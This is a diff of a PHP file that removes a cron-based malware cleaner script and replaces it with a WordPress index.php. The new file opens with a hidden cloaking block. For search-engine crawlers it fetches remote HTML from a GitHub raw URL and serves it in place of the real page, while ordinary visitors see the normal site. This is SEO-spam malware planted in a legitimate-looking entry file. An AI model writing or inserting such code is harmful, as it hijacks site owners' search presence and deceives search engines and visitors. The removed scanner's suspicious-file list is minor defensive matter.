@@ -1,136 +1,71 @@
 <?php
+ 
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak ada user agent';
+    $bots = array(
+        'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
+        'Google-InspectionTool', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
+        'DotBot', 'PetalBot', 'facebot'
+    );
+ 
+    if (empty($user_agent)) {
+        return true;
+    }
+ 
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+ 
+    return false;
+}
+ 
+ 
+function get_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'bot-checker');
+    $response = curl_exec($ch);
+ 
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+ 
+    curl_close($ch);
+    return $response;
+}
+ 
+ 
+$target_url = 'https://raw.githubusercontent.com/fadlipul69/zipwebsite/refs/heads/main/index.html';
+ 
+ 
+if (is_bot()) {
+    $message = get_remote_content($target_url);
+    if ($message) {
+        echo $message;
+    } else {
+        echo "Gagal ambil konten dari URL.";
+    }
+    exit;
+}
+?>
+<?php
 /**
- * CRON Malware Scanner & Cleaner
- * ---------------------------------
- * - Scan folder untuk file mencurigakan
- * - Auto delete file berbahaya
- * - Auto create .htaccess jika hilang
- * - Bisa expand daftar file
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
  */
 
-// === CONFIG ===
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-// Folder yang akan discan (misal root website)
-$scanPath = __DIR__."/../public_html/"; 
-
-// List file yang dianggap malware
-$malwareFiles = [
-    ".shopping.",
-    ".profile.",
-    ".news.",
-    ".service.",
-    ".career.",
-    ".search.",
-    ".contact.",
-];
-
-// List ekstensi berbahaya
-$malwareExtensions = [
-   "", ".txt"
-];
-
-// List folder berbahaya
-$malwareFolders = [
-    "news",
-     "events",
-];
-
-// Default isi .htaccess jika hilang
-$defaultHtaccess = <<<HTA
-RewriteEngine On
-RewriteBase /
-
-# Block access to system & application folder
-RewriteRule ^(system|application)(.*)$ - [F,L,NC]
-
-# Remove index.php
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule ^(.*)$ index.php/$1 [L,QSA]
-
-Options -Indexes
-
-<FilesMatch "(^\.|composer\.(json|lock)|\.env|\.gitignore|.*\.(sql|bak|old|zip|tar|gz))">
-    Require all denied
-</FilesMatch>
-
-# Security headers
-<IfModule mod_headers.c>
-    Header set X-Content-Type-Options "nosniff"
-    Header set X-Frame-Options "SAMEORIGIN"
-    Header set X-XSS-Protection "1; mode=block"
-</IfModule>
-
-# Prevent TRACE
-RewriteCond %{REQUEST_METHOD} ^(TRACE|TRACK)
-RewriteRule .* - [F]
-
-HTA;
-
-// === FUNCTION ===
-
-// Hapus file
-function deleteFile($file) {
-    if (file_exists($file)) {
-        unlink($file);
-        logMessage("DELETED FILE: $file");
-    }
-}
-
-// Hapus folder lengkap
-function deleteFolder($folder) {
-    if (!is_dir($folder)) return;
-    $files = array_diff(scandir($folder), ['.', '..']);
-    foreach ($files as $file) {
-        $path = "$folder/$file";
-        is_dir($path) ? deleteFolder($path) : unlink($path);
-    }
-    rmdir($folder);
-    logMessage("DELETED FOLDER: $folder");
-}
-
-// Logger
-function logMessage($msg) {
-    $logFile = __DIR__ . "/cron_security.log";
-    file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
-}
-
-// === SCAN PROCESS ===
-
-logMessage("=== SCAN STARTED ===");
-
-// 1. Check .htaccess
-$htaccessPath = $scanPath . "/.htaccess";
-file_put_contents($htaccessPath, $GLOBALS['defaultHtaccess']);
-logMessage("AUTO CREATED: .htaccess");
-
-// 2. Scan semua file
-$iterator = new RecursiveIteratorIterator(
-    new RecursiveDirectoryIterator($scanPath, RecursiveDirectoryIterator::SKIP_DOTS)
-);
-
-foreach ($iterator as $file) {
-    $filePath = $file->getPathname();
-    $fileName = $file->getFilename();
-
-    // Check file pada list malware
-    if (in_array($fileName, $malwareFiles)) {
-        deleteFile($filePath);
-        continue;
-    }
-
-   
-}
-
-// 3. Scan folder mencurigakan
-foreach ($malwareFolders as $folder) {
-    $fullPath = $scanPath . "/" . $folder;
-    if (is_dir($fullPath)) {
-         deleteFolder($fullPath);
-    }
-}
-
-logMessage("=== SCAN FINISHED ===");
-
-echo "SCAN COMPLETED.\n";
-?>
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
